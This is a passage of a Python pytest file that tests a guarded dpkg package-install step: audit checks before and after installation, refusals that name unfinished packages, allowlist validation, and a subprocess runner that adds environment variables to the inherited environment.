    """Design F6: "a fresh transaction requires an empty `dpkg --audit`".

    The re-read happens AFTER the recovery and BEFORE `dpkg -i`, and it
    is recorded durably beside `intended.json` for the same reason that
    record exists (design R7): a run interrupted inside the install
    leaves behind what the host looked like when it was entered. Here
    that is the one statement nothing else preserves — dpkg's own
    unfinished-transaction report at the moment this step was about to
    mutate, which is what a later reader needs to attribute a trigger
    handler like `man-db` to THIS transaction rather than to the host.

    `runc` is the earlier run's package, left `unpacked`; the recovery
    completes it, so what the re-read measures and this record carries is
    an empty report — the evidence that the transaction below started
    from one.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    interrupted = _QUERY_BEFORE + "runc 1.4.0-0ubuntu1 unpacked\n"
    settled = _QUERY_AFTER + "runc 1.4.0-0ubuntu1 installed\n"
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            (("dpkg", "--audit"), [_audit_report(packages=("runc",)), ""]),
            (("dpkg-query",), [interrupted, interrupted, settled]),
            *_fenced_outputs(),
        ],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    record = inputs.parent / "pre-install-audit.json"
    assert record.is_file()
    assert json.loads(record.read_text(encoding="utf-8")) == {"run": "run-a", "flagged": []}
    assert len(_calls_named(runner=runner, argv=("dpkg", "-i"))) == 1


def test_the_package_step_refuses_when_the_recovery_left_dpkg_audit_naming_a_package(
    tmp_path: Path,
) -> None:
    """Design F6: the install waits for the empty audit rather than hoping for it.

    The recovery is aimed at the states it can finish, and it can FAIL to
    finish them — a maintainer script that exits non-zero, a trigger
    whose handler is itself unfinished. `dpkg -i` over a database that
    still holds an unfinished transaction is the one thing the recovery
    existed to prevent, so the report is read AGAIN afterwards and the
    install is issued only when it is empty.

    The refusal names the package, because the operator's next move
    depends on which one it is, and the step never substitutes
    `dpkg --configure -a`: adopting whatever else the host has left
    pending is exactly the mutation the fence refuses on behalf of.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    interrupted = _QUERY_BEFORE + "runc 1.4.0-0ubuntu1 unpacked\n"
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            # One answer, repeated: the recovery below does not clear it.
            (("dpkg", "--audit"), [_audit_report(packages=("runc",))]),
            (("dpkg-query",), [interrupted]),
            *_fenced_outputs(),
        ],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "runc" in outcome.refusal
    assert outcome.installed == ()
    assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []
    assert _calls_named(runner=runner, argv=("dpkg", "--configure", "-a")) == []
    # The recovery was attempted, and what it left behind is recorded.
    assert len(_calls_named(runner=runner, argv=("dpkg", "--configure"))) == 1
    record = inputs.parent / "pre-install-audit.json"
    assert json.loads(record.read_text(encoding="utf-8")) == {"run": "run-a", "flagged": ["runc"]}


def test_the_package_step_refuses_when_dpkg_audit_names_a_package_after_the_install(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the additions are not installed while dpkg is.

    The dpkg-query difference says the right packages LANDED; it says
    nothing about whether dpkg finished with them. An install whose
    trigger processing was interrupted — FAULTS B-06's `man-db`, whose
    trigger this install's own man pages activate — leaves every audited
    package in the table and the transaction unfinished, and reporting
    that as published is what strands the host: apt and
    unattended-upgrades stay blocked until somebody runs
    `dpkg --configure -a` by hand.

    So the report is read once more after the install and after the
    difference check, and a name in it refuses. The pre-install record
    read empty, which is what makes the refusal attributable: whatever
    `man-db` is doing in that report, this transaction put it there.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            # Empty before the install on both reads, and not after it.
            (("dpkg", "--audit"), ["", "", _audit_report(packages=("man-db",))]),
            *_fenced_outputs(),
        ],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "man-db" in outcome.refusal
    assert outcome.installed == ()
    # Refused AFTER the audited transaction ran, which is the only place
    # this can be seen: the install is what left the report non-empty.
    assert len(_calls_named(runner=runner, argv=("dpkg", "-i"))) == 1
    record = inputs.parent / "pre-install-audit.json"
    assert json.loads(record.read_text(encoding="utf-8")) == {"run": "run-a", "flagged": []}


def test_the_package_step_refuses_when_the_runs_committed_inputs_are_unreadable(
    tmp_path: Path,
) -> None:
    """A run whose package inputs cannot be read installs nothing at all.

    The refusal is RETURNED rather than raised, which is the Result
    discipline this repository requires carried in the stdlib-only shape
    the guard modules use — they are copied onto the guarded host and run
    against its bare interpreter, where `returns` is not importable.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = tmp_path / "runs" / "run-a" / "inputs"
    inputs.mkdir(parents=True)
    runner = _RecordedRunner(result=runner_module.CommandOutput)

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "packages.json" in outcome.refusal
    assert runner.calls == []


def test_the_package_step_refuses_committed_inputs_that_declare_no_allowlist(
    tmp_path: Path,
) -> None:
    """Inputs that parse but carry no allowlist are a refusal, not an empty install.

    An absent allowlist read as "install nothing" would make a malformed
    upload indistinguishable from a successful transaction — the step would
    report a clean install having audited nothing.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    payload = _payload(cache=tmp_path / "cache")
    del payload["allow"]
    inputs = _declare(root=tmp_path, payload=payload)
    runner = _RecordedRunner(result=runner_module.CommandOutput)

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "allowlist" in outcome.refusal
    assert runner.calls == []


def test_the_default_runner_spawns_the_argv_and_answers_its_output() -> None:
    """The real runner is the one place the guard's package step spawns anything.

    Asserted against a harmless `/bin/echo` rather than against a mock,
    because the thing worth proving is that the seam is wired to
    `subprocess` with the timeout it was given — every other test in this
    file deliberately proves the opposite, that nothing else spawns.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)

    answer = runner_module.default_runner(
        command=runner_module.TimedCommand(
            argv=("/bin/echo", "recorded"),
            timeout_seconds=runner_module.COMMAND_TIMEOUT_SECONDS,
        )
    )

    assert answer.returncode == 0
    assert answer.stdout == "recorded\n"


def test_the_default_runner_adds_its_environment_rather_than_replacing_it() -> None:
    """`env` carries ADDITIONS, so the one variable the fence sets rides along.

    `dpkg -i` needs `DPKG_FRONTEND_LOCKED=1` AND the dpkg environment the
    guard did not build (PATH above all). A runner that passed `env`
    straight through to `subprocess` would hand dpkg an environment of
    exactly one variable.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)

    answer = runner_module.default_runner(
        command=runner_module.TimedCommand(
            argv=("/usr/bin/env",),
            timeout_seconds=runner_module.COMMAND_TIMEOUT_SECONDS,
            env={"DPKG_FRONTEND_LOCKED": "1"},
        )
    )

    assert "DPKG_FRONTEND_LOCKED=1" in answer.stdout.splitlines()
    assert any(line.startswith("PATH=") for line in answer.stdout.splitlines())
